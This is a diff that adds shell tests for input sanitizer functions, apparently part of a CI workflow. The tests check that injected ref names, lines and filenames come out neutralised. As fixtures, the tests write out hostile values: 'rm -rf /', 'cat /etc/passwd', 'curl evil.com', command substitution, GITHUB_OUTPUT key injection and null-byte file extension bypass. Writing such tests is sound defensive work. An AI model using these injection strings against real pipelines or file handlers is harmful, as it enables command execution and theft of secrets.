@@ -371,6 +371,226 @@ run_test "Sanitizer version is v3" \
   "iccDEV-sanitizer-v3"
 
 # =============================================================================
+# Shell Metacharacter Injection Tests (sanitize_ref)
+# =============================================================================
+
+run_test "Ref: semicolon command chain" \
+  "branch; rm -rf /" \
+  "branch-rm-rf-/" \
+  "sanitize_ref"
+
+run_test "Ref: pipe operator" \
+  "branch | cat /etc/passwd" \
+  "branch-cat-/etc/passwd" \
+  "sanitize_ref"
+
+run_test "Ref: double ampersand" \
+  "branch && curl evil.com" \
+  "branch-curl-evil.com" \
+  "sanitize_ref"
+
+run_test "Ref: backtick substitution" \
+  'branch`whoami`end' \
+  "branch-whoami-end" \
+  "sanitize_ref"
+
+run_test "Ref: dollar-paren substitution" \
+  'branch$(id)end' \
+  "branch-id-end" \
+  "sanitize_ref"
+
+run_test "Ref: redirect operators" \
+  "branch > /tmp/pwned" \
+  "branch-/tmp/pwned" \
+  "sanitize_ref"
+
+run_test "Ref: double redirect append" \
+  "branch >> /tmp/pwned" \
+  "branch-/tmp/pwned" \
+  "sanitize_ref"
+
+run_test "Ref: subshell in parens" \
+  "branch(echo pwned)" \
+  "branch-echo-pwned" \
+  "sanitize_ref"
+
+run_test "Ref: curly brace expansion" \
+  "branch{a,b,c}" \
+  "branch-a-b-c" \
+  "sanitize_ref"
+
+run_test "Ref: double-quoted string" \
+  'branch"injected"end' \
+  "branch-injected-end" \
+  "sanitize_ref"
+
+run_test "Ref: single-quoted string" \
+  "branch'injected'end" \
+  "branch-injected-end" \
+  "sanitize_ref"
+
+# =============================================================================
+# Newline Injection in Refs
+# =============================================================================
+
+run_test "Ref: newline injection" \
+  "$(printf 'branch\ninjected')" \
+  "branchinjected" \
+  "sanitize_ref"
+
+run_test "Ref: CRLF injection" \
+  "$(printf 'branch\r\ninjected')" \
+  "branchinjected" \
+  "sanitize_ref"
+
+run_test "Ref: null byte truncation attempt" \
+  "$(printf 'branch\x00hidden')" \
+  "branchhidden" \
+  "sanitize_ref"
+
+# =============================================================================
+# Overlong UTF-8 Bypass Attempts
+# =============================================================================
+
+# Overlong 2-byte encoding of '/' (U+002F): 0xC0 0xAF
+# With LC_ALL=C in sanitize_ref, these bytes are individually non-ASCII → replaced
+run_test "Ref: overlong UTF-8 slash (0xC0 0xAF)" \
+  "$(printf 'branch\xc0\xafetc\xc0\xafpasswd')" \
+  "branch-etc-passwd" \
+  "sanitize_ref"
+
+# Overlong bytes in sanitize_line: preserved as invalid UTF-8
+# (not a practical attack — no modern system decodes overlong to ASCII)
+echo "Test $((pass + fail + 1)): Line: overlong UTF-8 bytes preserved (no decode)"
+overlong_input=$(printf 'test\xc0\xbcscript\xc0\xbe')
+result=$(sanitize_line "$overlong_input")
+# Verify the '<'/'>' ASCII bytes (0x3c/0x3e) are NOT present
+if ! printf '%s' "$result" | xxd -p | grep -q '3c\|3e'; then
+  echo "  ✅ PASS (no ASCII < or > injected from overlong encoding)"
+  pass=$((pass + 1))
+else
+  echo "  ❌ FAIL (overlong was decoded to ASCII — dangerous!)"
+  fail=$((fail + 1))
+fi
+echo ""
+
+# =============================================================================
+# GITHUB_OUTPUT Delimiter Injection Simulation
+# =============================================================================
+
+# An attacker might try to inject key=value pairs via newlines in a ref name
+run_test "Ref: GITHUB_OUTPUT delimiter injection" \
+  "$(printf 'value\nsecret=stolen')" \
+  "valuesecret-stolen" \
+  "sanitize_ref"
+
+run_test "Line: heredoc delimiter injection attempt" \
+  "$(printf 'output<<EOF\nmalicious\nEOF')" \
+  "output&lt;&lt;EOF malicious EOF"
+
+# =============================================================================
+# sanitize_print Edge Cases
+# =============================================================================
+
+# Test newline collapse (>3 consecutive → 3)
+echo "Test $((pass + fail + 1)): sanitize_print collapses >3 newlines"
+collapse_input="$(printf 'line1\n\n\n\n\n\nline2')"
+result=$(sanitize_print "$collapse_input")
+newline_count=$(printf '%s' "$result" | tr -cd '\n' | wc -c)
+echo "  Input has 6 consecutive newlines between lines"
+echo "  Result newlines: $newline_count"
+if [ "$newline_count" -le 3 ]; then
+  echo "  ✅ PASS (collapsed to ≤3)"
+  pass=$((pass + 1))
+else
+  echo "  ❌ FAIL (got $newline_count newlines)"
+  fail=$((fail + 1))
+fi
+echo ""
+
+# Test that sanitize_print preserves needed newlines
+echo "Test $((pass + fail + 1)): sanitize_print preserves normal newlines"
+normal_input="$(printf 'line1\nline2\nline3')"
+result=$(sanitize_print "$normal_input")
+newline_count=$(printf '%s' "$result" | tr -cd '\n' | wc -c)
+echo "  Input: 3 lines with 2 newlines"
+echo "  Result newlines: $newline_count"
+if [ "$newline_count" -eq 2 ]; then
+  echo "  ✅ PASS"
+  pass=$((pass + 1))
+else
+  echo "  ❌ FAIL (expected 2, got $newline_count)"
+  fail=$((fail + 1))
+fi
+echo ""
+
+# =============================================================================
+# sanitize_filename Edge Cases
+# =============================================================================
+
+run_test "Filename: double-encoded traversal (%2e%2e%2f)" \
+  "%2e%2e%2fetc%2fpasswd" \
+  "2e-2e-2fetc-2fpasswd" \
+  "sanitize_filename"
+
+run_test "Filename: null byte extension bypass" \
+  "$(printf 'evil.php\x00.jpg')" \
+  "evil.php.jpg" \
+  "sanitize_filename"
+
+# =============================================================================
+# Boundary / Edge Case Tests
+# =============================================================================
+
+# Exactly MAXLEN input should not be truncated
+echo "Test $((pass + fail + 1)): Input exactly at MAXLEN (no truncation)"
+exact_input=$(printf 'A%.0s' $(seq 1 "$SANITIZE_LINE_MAXLEN"))
+result=$(sanitize_line "$exact_input")
+result_len=${#result}
+echo "  Input length: $SANITIZE_LINE_MAXLEN"
+echo "  Result length: $result_len"
+if [ "$result_len" -eq "$SANITIZE_LINE_MAXLEN" ]; then
+  echo "  ✅ PASS (not truncated)"
+  pass=$((pass + 1))
+else
+  echo "  ❌ FAIL (was truncated or changed)"
+  fail=$((fail + 1))
+fi
+echo ""
+
+# MAXLEN+1 should be truncated
+echo "Test $((pass + fail + 1)): Input at MAXLEN+1 (truncated)"
+over_input=$(printf 'B%.0s' $(seq 1 $((SANITIZE_LINE_MAXLEN + 1))))
+result=$(sanitize_line "$over_input")
+result_len=${#result}
+echo "  Input length: $((SANITIZE_LINE_MAXLEN + 1))"
+echo "  Result length: $result_len"
+if [ "$result_len" -le "$SANITIZE_LINE_MAXLEN" ]; then
+  echo "  ✅ PASS (truncated to ≤$SANITIZE_LINE_MAXLEN)"
+  pass=$((pass + 1))
+else
+  echo "  ❌ FAIL (not truncated)"
+  fail=$((fail + 1))
+fi
+echo ""
+
+# Empty/whitespace-only inputs
+run_test "Empty string to sanitize_ref" \
+  "" \
+  "ref-unknown" \
+  "sanitize_ref"
+
+run_test "Whitespace-only to sanitize_ref" \
+  "   " \
+  "ref-unknown" \
+  "sanitize_ref"
+
+run_test "All-dashes to sanitize_ref" \
+  "---" \
+  "ref-unknown" \
+  "sanitize_ref"
+
+# =============================================================================
 # Results Summary
 # =============================================================================
 
